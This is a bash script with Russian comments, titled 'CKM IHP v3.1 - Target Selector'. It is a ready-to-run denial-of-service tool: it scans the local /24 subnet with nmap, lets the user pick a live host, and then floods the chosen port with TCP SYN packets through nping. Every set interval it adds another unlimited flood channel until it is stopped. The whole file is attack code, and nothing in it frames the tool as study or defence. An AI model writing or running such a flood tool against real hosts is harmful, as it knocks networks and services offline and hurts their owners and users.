#!/bin/bash

# ==============================================
#        CKM IHP v3.1 - Target Selector
# ==============================================

clear
echo "=============================================="
echo "    CKM IHP v3.1 - Target Selector"
echo "=============================================="
echo ""

# Автоопределение интерфейса (en0 — провод, en1 — Wi-Fi)
IFACE="en0"
LOCAL_IP=$(ifconfig $IFACE | grep "inet " | awk '{print $2}')
if [ -z "$LOCAL_IP" ]; then
    IFACE="en1"
    LOCAL_IP=$(ifconfig $IFACE | grep "inet " | awk '{print $2}')
fi
if [ -z "$LOCAL_IP" ]; then
    echo "[-] No active network interface found."
    exit 1
fi

SUBNET=$(echo $LOCAL_IP | cut -d'.' -f1-3)
echo "[*] Interface: $IFACE | Local IP: $LOCAL_IP"
echo "[*] Scanning $SUBNET.0/24..."
echo ""

# Сканирование сети
sudo nmap -sn $SUBNET.0/24 -oG - 2>/dev/null | grep "Status: Up" | awk '{print $2}' | nl

# Выбор цели
echo ""
read -p "Select target number: " TARGET_NUM
TARGET_IP=$(sudo nmap -sn $SUBNET.0/24 -oG - 2>/dev/null | grep "Status: Up" | awk '{print $2}' | sed -n "${TARGET_NUM}p")

if [ -z "$TARGET_IP" ]; then
    echo "[-] Invalid target."
    exit 1
fi

# Параметры атаки
read -p "Target port (default 80): " PORT
PORT=${PORT:-80}
read -p "Packets/sec per channel (default 5000): " RATE
RATE=${RATE:-5000}
read -p "Channel interval in seconds (default 60): " INTERVAL
INTERVAL=${INTERVAL:-60}

clear
echo "=============================================="
echo "    ATTACKING $TARGET_IP:$PORT"
echo "    Rate: $RATE pps | Interval: $INTERVAL sec"
echo "=============================================="
echo "[!] Ctrl+C to stop"
echo ""

# Обработчик Ctrl+C
cleanup() {
    echo -e "\n[!] Stopping all attack channels..."
    sudo killall nping 2>/dev/null
    echo "[✓] Attack stopped."
    exit 0
}
trap cleanup SIGINT

# Запуск многоканального SYN-флуда
CHANNEL=1
while true; do
    echo "[$(date '+%H:%M:%S')] Channel #$CHANNEL (Total: $((CHANNEL * RATE)) pps)"
    sudo nping --tcp --flags syn --dest-port $PORT --rate $RATE -c 0 $TARGET_IP </dev/null >/dev/null 2>&1 &
    CHANNEL=$((CHANNEL + 1))
    sleep $INTERVAL
done
